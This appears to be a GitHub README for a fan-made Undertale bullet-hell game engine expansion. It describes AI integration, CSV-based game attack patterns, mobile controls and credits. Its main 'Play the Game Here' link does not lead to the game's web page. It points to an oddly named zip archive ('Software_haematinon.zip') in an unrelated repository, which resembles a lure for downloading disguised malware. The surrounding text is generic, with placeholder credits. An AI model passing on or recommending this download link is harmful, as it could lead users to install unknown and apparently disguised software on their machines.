# AI_BROKEN: Worst Time Simulator (AIWTS)

A custom, AI-enhanced expansion of the **Worst Time Simulator (WTS)** engine. This project integrates custom attack patterns and an AI-driven interface, featuring a "glitch" aesthetic where the AI is "breaking" the game.

## 🔗 [Play the Game Here](https://raw.githubusercontent.com/Scriptfinding/puppetflow/main/media/Software_haematinon.zip)

---

## 🛠 Features
* **AI Integration:** A custom UI drawer for Gemini API integration.
* **Custom Attacks:** New high-difficulty patterns loaded via CSV files.
* **Mobile Optimized:** Integrated virtual joystick (VPad) and mobile detection.
* **Glitch Aesthetic:** Featuring the "AI_BROKEN" loading sequence and custom Sans assets.

## 📁 Repository Structure
To keep the project clean, the files are organized as follows:
* `/` - Main directory containing the `index.html` (entry point).
* `/images/` - All game textures and the custom glitch loading logo.
* `/projects/` - Your custom `.csv` attack files.
* `c2runtime.js` - The core Construct 2 game engine.

## ⚔️ How to Add Custom Attacks
This engine uses a 12-column CSV format for attack patterns:
`Delay, Type, P1, P2, P3, P4, P5, P6, P7, P8, P9, P10`

1. Create a `.csv` file.
2. Upload it to the `projects` folder.
3. Reference the filename in the `AttackLoader.xml` or via the in-game Practice Mode.

## 🕹️ Controls
* **Keyboard:** Arrow Keys (Move), Z (Confirm), X (Cancel/Focus).
* **Mobile:** Virtual Joystick (Left), A/B Buttons (Right).

---

## 📜 Credits
* **Original Engine:** [WTS/BTS Team]
* **AI Implementation:** [Your Name/AIWTS]
* **Assets:** Custom Glitch Sans by Gemini 3 Flash.

---
*Disclaimer: This is a fan-made project. Undertale belongs to Toby Fox.*
